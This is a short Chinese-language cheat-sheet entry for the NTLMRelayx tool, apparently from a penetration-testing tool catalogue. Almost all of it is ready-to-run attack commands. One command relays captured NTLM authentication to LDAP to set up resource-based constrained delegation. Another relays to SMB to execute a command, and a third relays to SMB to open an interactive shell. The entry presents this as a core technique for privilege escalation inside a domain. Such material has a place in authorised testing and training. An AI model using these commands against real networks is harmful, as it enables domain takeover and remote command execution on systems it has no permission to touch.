### NTLMRelayx

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `中继攻击` `NTLM` `跨协议` |

## NTLM 中继攻击利用

### 中继到 LDAP 并尝试配置基于资源的约束委派
```bash
bash ntlmrelayx.sh -t ldap://192.168.1.10 --delegate-access
```

### 中继到 SMB 并执行命令
```bash
bash ntlmrelayx.sh -t smb://192.168.1.20 -c 'whoami'
```

### 中继到 SMB 并开启交互式 Shell
```bash
bash ntlmrelayx.sh -t smb://192.168.1.20 -i
```

- ✓ 将捕获的认证请求跨协议中继
- ✓ 支持 SMB/HTTP/LDAP 等多种协议
- 域内特权提升的核心技术
